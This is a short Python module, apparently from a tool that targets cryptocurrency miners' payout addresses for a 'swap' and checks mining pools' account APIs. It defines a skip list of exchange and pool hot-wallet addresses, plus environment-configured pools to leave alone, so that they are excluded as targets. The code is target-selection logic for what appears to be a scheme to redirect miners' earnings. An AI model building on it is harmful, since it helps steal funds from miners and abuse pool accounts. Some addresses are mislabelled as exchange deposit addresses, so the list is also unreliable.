"""Targets not worth attempting.

EXCHANGE_PAYOUT: known payout addresses of custodial pools and exchanges. A
miner pointing there is still worth a swap, but a *pool* payout address is not,
so these are skipped as targets.
SKIP_POOLS: pools whose account API has been 403/Cloudflare for days.
"""
import os

EXCHANGE_PAYOUT = {
    # 2Miners / pool hot wallets and major exchange deposit addresses
    "0x0000000000000000000000000000000000000000",
    "0x28c6c06298d514db089934071355e5743bf21d60",
    "0x21a31ee1afc51d94c2efccaa2092ad1028285549",
    "0xdfd5293d8e347dfe59e90efd55b2956a1343963d",
    "0x56eddb7aa87536c09ccc2793473599fd21a8b17f",
    "0x9696f59e4d72e237be84ffd425dcad154bf96976",
    "0x4976a4a02f38326660d17bf34b431dc6e2eb2327",
    "0xd551234ae421e3bcba99a0da6d736074f22192ff",
    "0x3f5ce5fbfe3e9af3971dd833d26ba9b5c936f0be",
    "0xdac17f958d2ee523a2206206994597c13d831ec7",
}

SKIP_POOLS = set(p for p in os.environ.get("SKIP_POOLS", "").split(",") if p)


def is_blacklisted(address: str) -> bool:
    return address.lower() in {a.lower() for a in EXCHANGE_PAYOUT}


def pool_skipped(pid: str) -> bool:
    return pid in SKIP_POOLS